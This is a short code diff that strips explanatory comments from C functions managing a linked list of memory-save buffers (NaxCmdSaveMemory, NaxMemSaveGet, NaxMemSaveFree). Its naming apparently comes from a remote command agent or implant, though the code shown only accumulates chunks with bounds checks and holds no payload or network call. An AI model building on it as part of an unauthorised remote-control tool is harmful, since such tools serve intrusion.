@@ -24,7 +24,6 @@ FUNC INT NaxCmdSaveMemory( PNAX_INSTANCE Nax,
     if ( 12 + chunkSize > args_len ) return NAX_ERR_INVAL;
     PBYTE  chunkData = (PBYTE)args + 12;
 
-    /* Find or create MemSave node */
     NAX_MEMSAVE* ms = Nax->MemSaveHead;
     while ( ms ) {
         if ( ms->MemoryId == memoryId ) break;
@@ -46,7 +45,6 @@ FUNC INT NaxCmdSaveMemory( PNAX_INSTANCE Nax,
         Nax->MemSaveHead = ms;
     }
 
-    /* Append chunk data */
     UINT32 space = ms->TotalSize - ms->CurrentSize;
     UINT32 copy_len = ( chunkSize <= space ) ? chunkSize : space;
     if ( copy_len > 0 ) {
@@ -58,7 +56,6 @@ FUNC INT NaxCmdSaveMemory( PNAX_INSTANCE Nax,
     return NAX_OK;
 }
 
-/* Retrieve accumulated buffer by memoryId.  Returns NULL if not found. */
 FUNC NAX_MEMSAVE* NaxMemSaveGet( PNAX_INSTANCE Nax, UINT32 memoryId ) {
     NAX_MEMSAVE* ms = Nax->MemSaveHead;
     while ( ms ) {
@@ -68,7 +65,6 @@ FUNC NAX_MEMSAVE* NaxMemSaveGet( PNAX_INSTANCE Nax, UINT32 memoryId ) {
     return NULL;
 }
 
-/* Free a MemSave node and unlink it from the list. */
 FUNC VOID NaxMemSaveFree( PNAX_INSTANCE Nax, UINT32 memoryId ) {
     NAX_MEMSAVE** prev = &Nax->MemSaveHead;
     NAX_MEMSAVE*  ms   = Nax->MemSaveHead;
